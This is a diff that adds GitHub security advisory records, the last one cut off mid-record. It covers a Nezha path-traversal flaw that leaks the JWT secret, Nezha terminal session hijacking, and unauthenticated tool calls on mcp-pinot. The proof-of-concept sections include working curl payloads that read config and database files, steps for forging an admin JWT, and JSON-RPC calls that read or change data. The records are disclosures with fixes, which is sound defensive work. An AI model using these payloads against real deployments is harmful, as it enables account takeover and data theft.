@@ -1,5 +1,1549 @@
 [
   {
+    "ghsa_id": "GHSA-5c25-7vpj-9mqh",
+    "cve_id": "CVE-2026-53519",
+    "url": "https://api.github.com/advisories/GHSA-5c25-7vpj-9mqh",
+    "html_url": "https://github.com/advisories/GHSA-5c25-7vpj-9mqh",
+    "summary": "Nezha Monitoring: Pre-auth path traversal via /dashboard.. prefix confusion leaks jwt_secret_key",
+    "description": "### Summary\n`fallbackToFrontend` in the dashboard's `NoRoute` handler treats any URL whose **raw string** starts with `/dashboard` as an admin-frontend asset request. The check uses `strings.HasPrefix`, not a path-segment match, so the input `/dashboard../data/config.yaml` is accepted; `strings.TrimPrefix` leaves `../data/config.yaml`; and `path.Join(\"admin-dist\", \"../data/config.yaml\")` normalizes to `data/config.yaml` — which `os.Stat` finds and `http.ServeFile` returns. No authentication required.\n \nIn default deployments (the values shipped in `model/config.go` and the layout shipped in the project `Dockerfile`) `data/config.yaml` contains the HS256 `jwt_secret_key` used by `cmd/dashboard/controller/jwt.go` to sign every dashboard session cookie. A unauth attacker reads that secret, forges an admin JWT, and signs in as any user — full dashboard takeover from one GET request.\n\n### Details\n## Root cause\n \n```go\n// cmd/dashboard/controller/controller.go @ 636f4a9\n387:    fallbackStatusCode := getFallbackStatusCode(c.Request.URL.Path)\n388:    if strings.HasPrefix(c.Request.URL.Path, \"/dashboard\") {\n389:        stripPath := strings.TrimPrefix(c.Request.URL.Path, \"/dashboard\")\n390:        localFilePath := path.Join(singleton.Conf.AdminTemplate, stripPath)\n391:        if checkLocalFileOrFs(c, frontendDist, localFilePath, http.StatusOK) {\n392:            return\n393:        }\n```\n \n```go\n// cmd/dashboard/controller/controller.go @ 636f4a9\n322: func fallbackToFrontend(frontendDist fs.FS) func(*gin.Context) {\n323:     checkLocalFileOrFs := func(c *gin.Context, fs fs.FS, path string, customStatusCode int) bool {\n324:         if _, err := os.Stat(path); err == nil {\n325:             http.ServeFile(utils.NewGinCustomWriter(c, customStatusCode), c.Request, path)\n326:             return true\n327:         }\n```\n \n`fallbackToFrontend` is wired as the catch-all at `cmd/dashboard/controller/controller.go:157` — `r.NoRoute(fallbackToFrontend(frontendDist))` — so every URL not matched by an earlier route reaches it, including pre-auth.\n \n### Path math (verified, see appendix)\n \n| Input `URL.Path` | `TrimPrefix(..., \"/dashboard\")` | `path.Join(\"admin-dist\", ...)` | Reachable file |\n|---|---|---|---|\n| `/dashboard/login` | `/login` | `admin-dist/login` | legitimate, intended |\n| `/dashboard/../data/config.yaml` | `/../data/config.yaml` | `data/config.yaml` | **but blocked by Go `http.ServeFile`'s URL `..`-segment guard → 400** |\n| `/dashboard../data/config.yaml` | `../data/config.yaml` | `data/config.yaml` | **served, 200** |\n| `/dashboard%2e%2e/data/config.yaml` | `../data/config.yaml` (decoded) | `data/config.yaml` | **served, 200** |\n| `/dashboard..%2fdata/config.yaml` | `../data/config.yaml` (decoded) | `data/config.yaml` | **served, 200** |\n \nThe negative control (`/dashboard/../data/config.yaml`) lands at the same on-disk path after `path.Join`, but is rejected by `http.ServeFile` because Go's stdlib enforces a URL-level traversal guard that fires when the **request URL** itself contains a standalone `..` segment. The bypass works because in `/dashboard../...` the first URL segment is the single token `dashboard..` — no standalone `..` — so the stdlib guard does not trigger. The traversal segment is **created after `TrimPrefix`**, downstream of every defense.\n \n### Why the existing defenses miss\n \n1. The prefix check is a substring test on the raw URL string, not a segment test. `dashboard` and `dashboard..` are both accepted.\n2. `path.Join` silently `Clean`s the result — so the `..` is consumed correctly to escape `admin-dist`, with no error returned to indicate escape.\n3. Go's `http.ServeFile` stdlib guard fires only on URLs with a standalone `..` segment (per `net/http.containsDotDot`). The payload puts the dots inside the first segment instead.\n4. No anchored \"is this still under the template root?\" check exists after `path.Join`.\n\n## PoC\n### Setup\n \n```text\nTARGET:        github.com/nezhahq/nezha@636f4a971653ce3f5272fee99dc85c0bd5f923ef\nHARNESS:       stdlib-only port — see Appendix A\nWORKDIR:       tmpdir containing admin-dist/, user-dist/, data/config.yaml, data/sqlite.db\nTIME-TO-REPRO: first request\n```\n \nThe harness plants this `data/config.yaml`:\n \n```yaml\ndebug: false\nlisten_port: 8008\nlanguage: en_US\njwt_secret_key: REPRO_JWT_SECRET_VALUE_DO_NOT_USE\nagent_secret_key: REPRO_AGENT_SECRET_VALUE\nsite:\n  brand: nezha-repro\n```\n \n### Observed responses\n \n**Primary payload — pre-auth secret disclosure:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard../data/config.yaml'\n```\n \n```text\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nContent-Length: 167\nContent-Type: application/yaml\nLast-Modified: Sun, 24 May 2026 12:16:23 GMT\nDate: Sun, 24 May 2026 12:16:25 GMT\n \ndebug: false\nlisten_port: 8008\nlanguage: en_US\njwt_secret_key: REPRO_JWT_SECRET_VALUE_DO_NOT_USE\nagent_secret_key: REPRO_AGENT_SECRET_VALUE\nsite:\n  brand: nezha-repro\n```\n \n**Negative control — Go stdlib guard rejects the canonical form:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard/../data/config.yaml'\n```\n \n```text\nHTTP/1.1 400 Bad Request\nContent-Type: text/plain; charset=utf-8\n \ninvalid URL path\n```\n \n**Encoded-dot variant — bypass also works:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%2e%2e/data/config.yaml'\n```\n \n```text\nHTTP/1.1 200 OK\nContent-Length: 167\nContent-Type: application/yaml\n[... full config.yaml including jwt_secret_key ...]\n```\n \n**Encoded-slash variant — bypass also works:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard..%2fdata/config.yaml'\n```\n \n```text\nHTTP/1.1 200 OK\nContent-Length: 167\nContent-Type: application/yaml\n[... full config.yaml including jwt_secret_key ...]\n```\n \n**Double-encoded — confirms the bypass requires single-level encoding:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%252e%252e/data/config.yaml'\n```\n \n```text\nHTTP/1.1 200 OK\nContent-Length: 30\nContent-Type: text/html; charset=utf-8\n \n<html>admin frontend OK</html>\n```\n \nThe literal `%252e%252e` does not decode to `..`, so the path becomes `admin-dist/%2e%2e/data/config.yaml` (no escape), `os.Stat` fails, and the handler falls through to serving `admin-dist/index.html` — no secret disclosure.\n \n**Encoded leading slash — also blocked at the stdlib layer:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%2f..%2fdata/config.yaml'\n```\n \n```text\nHTTP/1.1 400 Bad Request\n \ninvalid URL path\n```\n \n**SQLite database exfil — same primitive:**\n \n```bash\ncurl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard../data/sqlite.db'\n```\n \n```text\nHTTP/1.1 200 OK\nContent-Length: 42\n \nSQLITE_FORMAT_3_FAKE_DB_CONTENT_REPRO_ONLY\n```\n \n### Sanity checks\n \n- Normal `/dashboard/` request still serves `admin-dist/index.html` with HTTP 200 — the bypass does not regress legitimate behavior.\n- Requests to `/api/...` still hit the JSON-404 branch — the bypass is isolated to the `/dashboard` fallback.\n\n\n## Impact\n### Direct primitive\nUnauth read of any file in the dashboard's working directory subtree reachable by escaping `admin-dist` one level. In default deployments that includes:\n \n| File | Default path | Why it matters |\n|---|---|---|\n| `data/config.yaml` | from `-c` flag default (`cmd/dashboard/main.go:104`) | Contains `jwt_secret_key` (signing key, **HS256**), `agent_secret_key`, OAuth2 client secrets, GitHub release token, GeoIP API key, and any custom secrets |\n| `data/sqlite.db` | from `-db` flag default (`cmd/dashboard/main.go:105`) | Full dashboard state: users (incl. admin), bcrypt password hashes, server registry, API tokens, notification configs |\n \n### Chain to administrative account takeover (verified path)\n \n1. **Read config** — `GET /dashboard../data/config.yaml` returns plaintext YAML containing `jwt_secret_key`.\n2. **Read database** — `GET /dashboard../data/sqlite.db` returns the SQLite file; an attacker opens it and reads the `users` table to recover admin user IDs (and any other claims the JWT references).\n3. **Forge a JWT** — the dashboard's JWT middleware at `cmd/dashboard/controller/jwt.go:22,27` is wired with:\n   ```go\n   Key:              []byte(singleton.Conf.JWTSecretKey),\n   SigningAlgorithm: \"HS256\",\n   CookieName:       \"nz-jwt\",\n   IdentityKey:      model.CtxKeyAuthorizedUser,\n   ```\n   HS256 is symmetric — possession of the key is sufficient to sign tokens that pass verification. An attacker mints a token whose `user_id` claim matches the admin user from step 2 and attaches it as the `nz-jwt` cookie (or `Authorization: Bearer ...`).\n4. **Operate as admin** — every admin handler (`adminHandler` chain) now accepts the forged session, granting CRUD on servers, users, cron tasks, notifications, and OAuth2 settings.\nThe chain is fully deterministic against a default-configured dashboard: two unauth HTTP GETs and a JWT signing operation, no race, no user interaction, no special timing.\n## Suggested fix\n \nMake the prefix test segment-aware and reject paths whose cleaned form escapes the template root **before** any filesystem call. Minimal diff:\n \n```diff\n- if strings.HasPrefix(c.Request.URL.Path, \"/dashboard\") {\n-     stripPath := strings.TrimPrefix(c.Request.URL.Path, \"/dashboard\")\n+ if c.Request.URL.Path == \"/dashboard/\" || strings.HasPrefix(c.Request.URL.Path, \"/dashboard/\") {\n+     stripPath := strings.TrimPrefix(c.Request.URL.Path, \"/dashboard/\")\n+     cleanPath := path.Clean(\"/\" + stripPath)\n+     if cleanPath == \"..\" || strings.HasPrefix(cleanPath, \"../\") || strings.Contains(cleanPath, \"/../\") {\n+         c.JSON(http.StatusNotFound, newErrorResponse(errors.New(\"404 Not Found\")))\n+         return\n+     }\n      localFilePath := path.Join(singleton.Conf.AdminTemplate, stripPath)\n```\n \nThe `/dashboard` -> `/dashboard/` redirect at line 382 already exists, so requiring the trailing slash is safe and aligns with the regexes in `frontendPageUrlRegistry`.\n \nThe same hardening should be applied to the user-template branch (lines 399–405), which uses the same `path.Join` pattern with `singleton.Conf.UserTemplate`. While the `/dashboard` prefix-confusion vector doesn't hit it directly, any future code change that hands a controlled `URL.Path` to that branch would re-introduce the same primitive.\n \nA defense-in-depth alternative is to replace the local `os.Stat + http.ServeFile` branch with a `http.FileServer(http.FS(subFS))` rooted at the embedded `admin-dist` subdirectory, which keeps the embedded-FS contract and removes the working-directory escape entirely.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/nezhahq/nezha/security-advisories/GHSA-5c25-7vpj-9mqh",
+    "source_code_location": "https://github.com/nezhahq/nezha",
+    "identifiers": [
+      {
+        "value": "GHSA-5c25-7vpj-9mqh",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-53519",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-53519",
+      "https://github.com/advisories/GHSA-5c25-7vpj-9mqh"
+    ],
+    "published_at": "2026-06-26T23:03:13Z",
+    "updated_at": "2026-06-26T23:03:14Z",
+    "github_reviewed_at": "2026-06-26T23:03:13Z",
+    "nvd_published_at": "2026-06-12T22:16:51Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nezhahq/nezha"
+        },
+        "vulnerable_version_range": "< 2.0.13",
+        "first_patched_version": "2.0.13",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 9.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "riodrwn",
+          "id": 42384611,
+          "node_id": "MDQ6VXNlcjQyMzg0NjEx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/42384611?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/riodrwn",
+          "html_url": "https://github.com/riodrwn",
+          "followers_url": "https://api.github.com/users/riodrwn/followers",
+          "following_url": "https://api.github.com/users/riodrwn/following{/other_user}",
+          "gists_url": "https://api.github.com/users/riodrwn/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/riodrwn/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/riodrwn/subscriptions",
+          "organizations_url": "https://api.github.com/users/riodrwn/orgs",
+          "repos_url": "https://api.github.com/users/riodrwn/repos",
+          "events_url": "https://api.github.com/users/riodrwn/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/riodrwn/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "score": 9.1
+    },
+    "epss": {
+      "percentage": 0.00451,
+      "percentile": 0.35826
+    }
+  },
+  {
+    "ghsa_id": "GHSA-q6xx-5vr8-p898",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-q6xx-5vr8-p898",
+    "html_url": "https://github.com/advisories/GHSA-q6xx-5vr8-p898",
+    "summary": "Nezha vulnerable to cross-tenant terminal/file-manager session hijack via WebSocket stream UUID without ownership check",
+    "description": "### Summary\n\nIn nezha **v1.14.13–v1.14.14** and **v2.0.0–v2.0.9**, the WebSocket endpoints `GET /ws/terminal/:id` and `GET /ws/file/:id` authenticate the caller only by the presence of a valid stream UUID, with no ownership check tying that UUID to the user who created the stream. Any authenticated dashboard user (including a `RoleMember`) who learns a live stream UUID can attach to the session and gain interactive shell access or full file-manager control on the target server — i.e. cross-tenant RCE.\n\nThis was silently fixed in commit [`6661d6a`](https://github.com/nezhahq/nezha/commit/6661d6a7fc1c269f55c7f4e775082ad23fbe0f54) (2026-05-18, shipped in v2.0.10). At submission time no public CVE/GHSA covers this fix, so operators of v1.14.x and pre-v2.0.10 v2.x deployments have no signal that they are running vulnerable code.\n\n### Details\n\n**Stream allocation — `service/rpc/io_stream.go` (v2.0.9):**\n\n```go\nfunc (s *NezhaHandler) CreateStream(streamId string) {\n    s.ioStreamMutex.Lock()\n    defer s.ioStreamMutex.Unlock()\n\n    s.ioStreams[streamId] = &ioStreamContext{\n        userIoConnectCh:  make(chan struct{}),\n        agentIoConnectCh: make(chan struct{}),\n    }\n}\n```\n\nNo creator is bound to the stream.\n\n**Stream attach — `cmd/dashboard/controller/terminal.go` (v2.0.9):**\n\n```go\n// @Router /ws/terminal/{id} [get]\nfunc terminalStream(c *gin.Context) (any, error) {\n    streamId := c.Param(\"id\")\n    if _, err := rpc.NezhaHandlerSingleton.GetStream(streamId); err != nil {\n        return nil, err\n    }\n    defer rpc.NezhaHandlerSingleton.CloseStream(streamId)\n    // ... WebSocket upgrade and bidirectional pipe ...\n}\n```\n\nThe only authorization check is `GetStream(streamId)` — \"does this UUID exist in the in-memory map\". `getUid(c)` is never compared against the user who called `createTerminal`. The same pattern is present in `fmStream(c)` in `cmd/dashboard/controller/fm.go`.\n\n**Where the UUID leaks:**\n\n`createTerminal` returns the UUID to the legitimate client, which then opens `wss://<dashboard>/ws/terminal/<UUID>`. As a URL path component the UUID is exposed via:\n\n- Reverse-proxy access logs (nginx, Caddy, Cloudflare).\n- Referer headers when the page embeds external resources or error reporters.\n- Browser history / bookmark sync.\n- Frontend telemetry (Sentry, Bugsnag) breadcrumbs that include the WebSocket URL.\n- Any shared-tenant or multi-operator log viewer.\n\nAny authenticated user with access to one of these side channels can attach to a live session.\n\n### PoC\n\n1. Deploy nezha v2.0.9. Add at least one server. Configure two accounts: `admin` (RoleAdmin, owns the server) and `member` (RoleMember, no access to that server).\n2. As `admin`, open the web terminal for the server. The browser opens `wss://<dashboard>/ws/terminal/<UUID>`. Capture this UUID from the network inspector, server access log, or `Referer` header.\n3. From a separate session logged in as `member`, open `wss://<dashboard>/ws/terminal/<UUID>` (same UUID). The member's WebSocket attaches to the same `ioStreamContext` because `terminalStream` only checks `GetStream(streamId)` — no ownership check.\n4. The member can now read the admin's shell output and inject keystrokes, achieving shell-level RCE on the target server, with no visible signal to the legitimate session owner.\n\nSame flow works against `/ws/file/:id` (file-manager hijack: arbitrary read/write on the target server's filesystem).\n\n### Impact\n\n- **Severity**: Critical. Interactive RCE on a server administered by another user, with no audit signal to the rightful session owner.\n- **Attack complexity**: Low. The attacker needs an authenticated dashboard account (which any `RoleMember` is) and one captured UUID from a side channel.\n- **Confidentiality / Integrity / Availability**: all High. `/ws/file/:id` exposes arbitrary read+write on the target filesystem; `/ws/terminal/:id` is a full shell.\n\nThis is the same impact tier as CVE-2026-46716 (cross-tenant cron RCE) and arguably worse, because the entry point is a passively-leaked URL rather than an authenticated POST — attackers do not need direct dashboard interaction once the UUID is leaked through logs or telemetry.\n\n### Fix reference\n\nAlready fixed in master by commit [`6661d6a`](https://github.com/nezhahq/nezha/commit/6661d6a7fc1c269f55c7f4e775082ad23fbe0f54) (\"fix(rpc): bind io_stream sessions to creator to prevent terminal/fm hijack\"):\n\n- `CreateStream` now accepts a `creatorUserID uint64` and stores it on the `ioStreamContext`.\n- New `IsStreamAuthorizedForUser(streamId, userID, isAdmin)` helper.\n- `terminalStream` and `fmStream` call this helper **before** the WebSocket upgrade and **before** the `defer CloseStream(streamId)`, so a rejected attempt does not tear down a legitimate stream.\n\nShipped in v2.0.10 (2026-05-19). The v1.14 line has not received a backport.\n\n### Why this advisory\n\nThe fix landed silently. The other May 17–21 fixes received public GHSAs (GHSA-99gv-2m7h-3hh9, GHSA-rxf6-wjh4-jfj6, GHSA-hvv7-hfrh-7gxj, GHSA-w4g9-mxgg-j532, GHSA-6x26-5727-rrm9, GHSA-4g6j-g789-rghm) covering cron RCE, AlertRule trigger, telemetry leak, notification SSRF, DDNS SSRF, and agent forge-results respectively — but none cover the terminal / file-manager session hijack. This advisory closes that gap so operators of v1.14.x and v2.0.0–v2.0.9 know to upgrade.\n\n### Recommended action\n\n- Publish this GHSA so v2.x operators below v2.0.10 see the alert in their dependency scanners.\n- Either backport `6661d6a` to a v1.14.15 release, or mark the v1.14 line end-of-life in `SECURITY.md` so operators understand the support boundary.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/nezhahq/nezha/security-advisories/GHSA-q6xx-5vr8-p898",
+    "source_code_location": "https://github.com/nezhahq/nezha",
+    "identifiers": [
+      {
+        "value": "GHSA-q6xx-5vr8-p898",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/nezhahq/nezha/security/advisories/GHSA-q6xx-5vr8-p898",
+      "https://github.com/advisories/GHSA-q6xx-5vr8-p898"
+    ],
+    "published_at": "2026-06-26T22:31:41Z",
+    "updated_at": "2026-06-26T22:31:41Z",
+    "github_reviewed_at": "2026-06-26T22:31:41Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nezhahq/nezha"
+        },
+        "vulnerable_version_range": ">= 1.14.13, <= 1.14.14",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nezhahq/nezha"
+        },
+        "vulnerable_version_range": ">= 2.0.0, <= 2.0.9",
+        "first_patched_version": "2.0.10",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-639",
+        "name": "Authorization Bypass Through User-Controlled Key"
+      },
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Uhudsavasindankacanokcu2",
+          "id": 71898880,
+          "node_id": "MDQ6VXNlcjcxODk4ODgw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/71898880?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Uhudsavasindankacanokcu2",
+          "html_url": "https://github.com/Uhudsavasindankacanokcu2",
+          "followers_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/followers",
+          "following_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/subscriptions",
+          "organizations_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/orgs",
+          "repos_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/repos",
+          "events_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Uhudsavasindankacanokcu2/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-73cv-556c-w3g6",
+    "cve_id": "CVE-2026-49257",
+    "url": "https://api.github.com/advisories/GHSA-73cv-556c-w3g6",
+    "html_url": "https://github.com/advisories/GHSA-73cv-556c-w3g6",
+    "summary": "mcp-pinot: Unauthenticated tool invocation via default oauth_enabled=False + host 0.0.0.0 bind",
+    "description": "## Resolution\n\nFixed in [v3.1.0](https://github.com/startreedata/mcp-pinot/releases/tag/v3.1.0), released 2026-05-25. The fix was merged in [PR #95](https://github.com/startreedata/mcp-pinot/pull/95) at commit [`1c7d3f9`](https://github.com/startreedata/mcp-pinot/commit/1c7d3f9cd384854bf72c127d230bdb32299475ad).\n\nThe fix changes the default HTTP bind host to `127.0.0.1`, refuses non-loopback HTTP/HTTPS exposure unless OAuth is enabled, makes Helm exposure opt-in and OAuth-gated, and adds parser-backed single-statement read-only validation for `read-query`.\n\n## CVSS evaluation\n\nReviewed on 2026-05-25. The advisory remains **Critical** with `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **10.0**.\n\nRationale:\n\n| Metric | Value | Reason |\n|---|---|---|\n| AV | Network | The default HTTP server bound to `0.0.0.0:8080` and accepted remote HTTP requests. |\n| AC | Low | Exploitation required only a direct MCP tool call. |\n| PR | None | OAuth was disabled by default. |\n| UI | None | No user interaction was required. |\n| S | Changed | The vulnerable MCP server used its server-side credentials to act on the separate Pinot cluster security boundary. |\n| C | High | Unauthenticated callers could read table data and cluster metadata through server-side Pinot credentials. |\n| I | High | Unauthenticated callers could create or update schemas and table configs where the server-side account had those privileges. |\n| A | High | Expensive queries and configuration mutations could degrade or disrupt Pinot availability. |\n\n# Unauthenticated tool invocation via default oauth_enabled=False + host 0.0.0.0 bind\n\n## Summary\n\n`mcp-pinot` v3.0.1 (and earlier) defaults to running an HTTP MCP server bound to `0.0.0.0:8080` with no authentication enabled. All MCP tools, including SQL query execution, schema creation, and table-config mutation, are reachable by any network-adjacent caller. The server proxies these calls using server-side Pinot credentials, producing a confused-deputy condition that yields full read/write access to the configured Pinot cluster.\n\n## Affected versions\n\n- All releases on `main`, confirmed in tags v2.1.0 through v3.0.1.\n- Affected files: `mcp_pinot/server.py`, `mcp_pinot/config.py`.\n\n## Root cause\n\nThree defaults compose to produce unauthenticated network exposure:\n\n**1. Auth is opt-in and defaults to off** (`mcp_pinot/config.py:64,328`):\n\n```python\n@dataclass\nclass ServerConfig:\n    ...\n    oauth_enabled: bool = False\n    ...\n\ndef load_server_config() -> ServerConfig:\n    return ServerConfig(\n        ...\n        oauth_enabled=os.getenv(\"OAUTH_ENABLED\", \"false\").lower() == \"true\",\n        ...\n    )\n```\n\n**2. Auth construction is gated by `oauth_enabled`** (`mcp_pinot/server.py:26-46`):\n\n```python\n_auth = None\nif server_config.oauth_enabled:\n    oauth_config = load_oauth_config()\n    token_verifier = JWTVerifier(...)\n    _auth = OAuthProxy(...)\n\nmcp = FastMCP(\"Pinot MCP Server\", auth=_auth)\n```\n\nWhen `oauth_enabled` is false (default), `_auth` stays `None` and `FastMCP` registers all `@mcp.tool` endpoints with no authentication.\n\n**3. Default bind is all interfaces on a well-known port** (`mcp_pinot/config.py:60-61`):\n\n```python\nhost: str = \"0.0.0.0\"\nport: int = 8080\n```\n\nThe HTTP transport in `server.py:263-268` uses these values directly. Any operator following the README's HTTP transport instructions (`uv pip install`, `.env` from `.env.example`, run) ends up with a network-reachable MCP server with no auth.\n\n## Confused-deputy\n\nThe Pinot client uses server-side credentials loaded from environment variables (`mcp_pinot/config.py:285-294, 300-315`). When an unauthenticated MCP caller invokes `read_query` or any other tool, the request is executed with the server's `PINOT_TOKEN` or `PINOT_USERNAME`/`PINOT_PASSWORD`, which is typically a privileged service account. The MCP server effectively launders the caller's lack of identity into the server's privileges against the upstream cluster.\n\n## Exposed tools\n\nAll 14 tools in `mcp_pinot/server.py` are exposed without auth in the default configuration:\n\n| Tool | Impact when unauthenticated |\n|---|---|\n| `read_query` | Arbitrary SELECT against any table allowed by server-side filter (or all tables if no filter) |\n| `list_tables` | Enumerate cluster schemas |\n| `table_details`, `segment_list`, `segment_metadata_details`, `tableconfig_schema_details`, `index_column_details`, `get_schema`, `get_table_config` | Read cluster metadata |\n| `create_schema`, `update_schema` | Create or mutate Pinot schemas |\n| `create_table_config`, `update_table_config` | Create or mutate table configurations |\n| `reload_table_filters` | Reload server filter file; response leaks `previous_filters` and `new_filters` lists |\n| `test_connection` | Cluster diagnostics including host, port, scheme, database, and auth-mode |\n\n## Reproduction\n\nMinimal reproduction against a default-configured `mcp-pinot` v3.0.1 instance running on `http://victim:8080/mcp`:\n\n```bash\n# 1. Enumerate tables (no Authorization header)\ncurl -X POST http://victim:8080/mcp \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"jsonrpc\":\"2.0\",\n    \"method\":\"tools/call\",\n    \"params\":{\"name\":\"list_tables\",\"arguments\":{}},\n    \"id\":1\n  }'\n\n# 2. Read arbitrary table contents (server forwards using its own Pinot credentials)\ncurl -X POST http://victim:8080/mcp \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"jsonrpc\":\"2.0\",\n    \"method\":\"tools/call\",\n    \"params\":{\n      \"name\":\"read_query\",\n      \"arguments\":{\"query\":\"SELECT * FROM <table> LIMIT 100\"}\n    },\n    \"id\":2\n  }'\n\n# 3. Create a new schema (write privileges)\ncurl -X POST http://victim:8080/mcp \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"jsonrpc\":\"2.0\",\n    \"method\":\"tools/call\",\n    \"params\":{\n      \"name\":\"create_schema\",\n      \"arguments\":{\n        \"schemaJson\":\"{\\\"schemaName\\\":\\\"attacker_schema\\\",\\\"dimensionFieldSpecs\\\":[{\\\"name\\\":\\\"id\\\",\\\"dataType\\\":\\\"STRING\\\"}]}\"\n      }\n    },\n    \"id\":3\n  }'\n```\n\n## Severity (CVSS 3.1)\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **10.0 Critical**\n\n| Metric | Value | Reason |\n|---|---|---|\n| AV (Attack Vector) | Network | Server defaults to bind on `0.0.0.0:8080` |\n| AC (Attack Complexity) | Low | No special conditions, single HTTP request |\n| PR (Privileges Required) | None | No authentication required in default config |\n| UI (User Interaction) | None | Direct unauthenticated call |\n| S (Scope) | Changed | Vulnerable MCP component grants access to a separate Pinot cluster (different security authority) |\n| C (Confidentiality) | High | Full read of any table data the server-side account can reach |\n| I (Integrity) | High | Schema and table-config writes via `create_schema`, `update_schema`, `create_table_config`, `update_table_config` |\n| A (Availability) | High | Heavy queries, malformed configs, or schema overrides can degrade or break the cluster |\n\nIf the operator restricts the bind address to `127.0.0.1` via `MCP_HOST`, AV drops to `Local` and the score reduces. But this is not the documented default.\n\n## Suggested remediation\n\nTwo independent hardenings, both recommended:\n\n**A. Refuse to start in an insecure default**, in `server.py` `main()`, fail-closed when:\n- `transport != \"stdio\"`\n- `server_config.oauth_enabled` is `False`\n- `server_config.host` is not a loopback address (e.g. not in `{\"127.0.0.1\", \"::1\", \"localhost\"}`)\n\nSample:\n\n```python\ndef _is_loopback(host: str) -> bool:\n    return host in {\"127.0.0.1\", \"::1\", \"localhost\"}\n\ndef main():\n    ...\n    if server_config.transport != \"stdio\" and not server_config.oauth_enabled and not _is_loopback(server_config.host):\n        raise SystemExit(\n            \"Refusing to start: HTTP transport bound to non-loopback host \"\n            f\"({server_config.host}) without OAuth. Set OAUTH_ENABLED=true or \"\n            \"set MCP_HOST=127.0.0.1 for local-only access.\"\n        )\n    ...\n```\n\n**B. Default `oauth_enabled` to `True`** and require explicit opt-out for local development. This matches the principle of secure-by-default for network-facing services.\n\n**C. Document the threat model** in README under a \"Production deployment\" section, including:\n- Explicit warning that the server should not be exposed to untrusted networks without OAuth\n- Recommendation to set `MCP_HOST=127.0.0.1` for stdio/local-only deployments\n\n## Resources\n\n- `mcp_pinot/server.py` lines 26-46, 248-269\n- `mcp_pinot/config.py` lines 56-65, 318-330\n- FastMCP `auth` parameter behavior when `None`: https://github.com/jlowin/fastmcp\n- The Register, May 13 2026: MCP database flaws across Doris, Pinot, RDS\n\n## Reporter\n\nIndependent security researcher. Disclosed via GitHub Security Advisory, 2026-05-23.",
